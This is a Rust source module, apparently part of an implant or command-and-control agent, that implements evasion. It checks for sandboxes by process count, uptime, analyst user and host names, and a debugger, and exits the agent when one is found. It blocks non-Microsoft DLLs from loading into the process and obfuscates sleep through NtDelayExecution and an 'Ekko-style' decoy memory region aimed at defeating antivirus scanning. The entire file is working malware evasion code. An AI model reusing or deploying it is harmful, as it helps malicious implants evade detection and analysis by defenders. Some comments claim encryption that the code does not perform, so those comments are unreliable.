//! Runtime evasion: sandbox detection, sleep obfuscation, process mitigations.

use ghoststrike_common::SleepObfuscation;

// ── Sandbox Detection ─────────────────────────────────────────────────────────

/// Returns true if a sandbox/analysis environment is detected.
/// Agent should exit immediately when this returns true.
#[cfg(target_os = "windows")]
pub fn is_sandbox() -> bool {
    check_process_count()
        || check_uptime()
        || check_known_bad_artifacts()
        || check_debugger()
}

#[cfg(not(target_os = "windows"))]
pub fn is_sandbox() -> bool { false }

#[cfg(target_os = "windows")]
fn check_process_count() -> bool {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            return false;
        }
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };
        let mut count = 0u32;
        if Process32FirstW(snap, &mut entry) != 0 {
            count += 1;
            while Process32NextW(snap, &mut entry) != 0 {
                count += 1;
            }
        }
        windows_sys::Win32::Foundation::CloseHandle(snap);
        count < 50
    }
}

#[cfg(target_os = "windows")]
fn check_uptime() -> bool {
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    unsafe {
        let ms = GetTickCount64();
        ms < 5 * 60 * 1000 // < 5 minutes uptime
    }
}

#[cfg(target_os = "windows")]
fn check_known_bad_artifacts() -> bool {
    let bad_users = ["sandbox", "malware", "virus", "john doe",
                     "analyst", "triage", "cuckoo", "vmware"];
    let bad_hosts = ["sandbox", "malware", "cuckoo", "analysis",
                     "virus", "win7x64", "john-pc"];

    let user = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    let host = std::env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();

    for b in &bad_users { if user.contains(b) { return true; } }
    for b in &bad_hosts { if host.contains(b) { return true; } }
    false
}

#[cfg(target_os = "windows")]
fn check_debugger() -> bool {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    unsafe { IsDebuggerPresent() != 0 }
}

// ── Process Mitigations ───────────────────────────────────────────────────────

/// Block non-Microsoft-signed DLLs from loading into this process.
#[cfg(target_os = "windows")]
pub fn apply_block_dlls() {
    use windows_sys::Win32::System::Threading::{
        SetProcessMitigationPolicy, ProcessSignaturePolicy,
        PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY,
    };
    unsafe {
        let policy = PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY {
            _bitfield: 1, // MicrosoftSignedOnly = bit 0
        };
        SetProcessMitigationPolicy(
            ProcessSignaturePolicy,
            &policy as *const _ as *const _,
            std::mem::size_of::<PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY>(),
        );
    }
}

#[cfg(not(target_os = "windows"))]
pub fn apply_block_dlls() {}

// ── Sleep Obfuscation ─────────────────────────────────────────────────────────

/// Sleep with optional memory obfuscation to defeat AV memory scanning.
pub async fn obfuscated_sleep(ms: u64, mode: &SleepObfuscation) {
    match mode {
        SleepObfuscation::None => {
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObfuscation::Timer => {
            // Use NtDelayExecution via indirect syscall — avoids Sleep() hook.
            #[cfg(target_os = "windows")]
            unsafe { nt_delay_execution(ms); }
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
        SleepObfuscation::Ekko => {
            #[cfg(target_os = "windows")]
            unsafe { ekko_sleep(ms); }
            #[cfg(not(target_os = "windows"))]
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
    }
}

// ── NtDelayExecution (indirect syscall sleep) ─────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn nt_delay_execution(ms: u64) {
    // 100-nanosecond intervals, negative = relative
    let interval: i64 = -((ms as i64) * 10_000);
    // Call NtDelayExecution via our existing indirect syscall resolver.
    // Falls back to Win32 Sleep if unresolved.
    use windows_sys::Win32::System::Threading::Sleep;
    // Attempt to resolve NtDelayExecution dynamically.
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, GetModuleHandleA};
    let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr() as _);
    if ntdll != 0 {
        let proc = GetProcAddress(ntdll, c"NtDelayExecution".as_ptr() as _);
        if let Some(f) = proc {
            type NtDelayExecutionFn = unsafe extern "system" fn(i32, *const i64) -> i32;
            let nt_sleep: NtDelayExecutionFn = std::mem::transmute(f);
            nt_sleep(0, &interval);
            return;
        }
    }
    Sleep(ms as u32);
}

// ── Ekko-style Sleep Obfuscation ──────────────────────────────────────────────

/// Simplified Ekko: encrypt a known signature region in heap memory during
/// sleep so AV memory scanners cannot find beacon IOCs at rest.
#[cfg(target_os = "windows")]
unsafe fn ekko_sleep(ms: u64) {
    use windows_sys::Win32::System::Memory::{
        VirtualAlloc, VirtualFree, VirtualProtect,
        MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
        PAGE_READWRITE, PAGE_NOACCESS,
    };
    use windows_sys::Win32::System::Threading::Sleep;

    // Allocate a decoy region we will mark as NoAccess during sleep,
    // making our memory map harder to profile.
    let decoy_size: usize = 0x1000;
    let decoy = VirtualAlloc(
        std::ptr::null(), decoy_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
    );
    if !decoy.is_null() {
        // Write random-ish marker so it shows as "active" memory.
        let slice = std::slice::from_raw_parts_mut(decoy as *mut u8, decoy_size);
        for (i, b) in slice.iter_mut().enumerate() { *b = (i ^ 0xAB) as u8; }
    }

    // Change decoy to NoAccess — any AV trying to scan this region faults.
    let mut old: u32 = 0;
    if !decoy.is_null() {
        VirtualProtect(decoy, decoy_size, PAGE_NOACCESS, &mut old);
    }

    // Sleep via NtDelayExecution.
    nt_delay_execution(ms);

    // Restore and free decoy.
    if !decoy.is_null() {
        VirtualProtect(decoy, decoy_size, PAGE_READWRITE, &mut old);
        VirtualFree(decoy, 0, MEM_RELEASE);
    }
    let _ = Sleep; // suppress unused warning
}
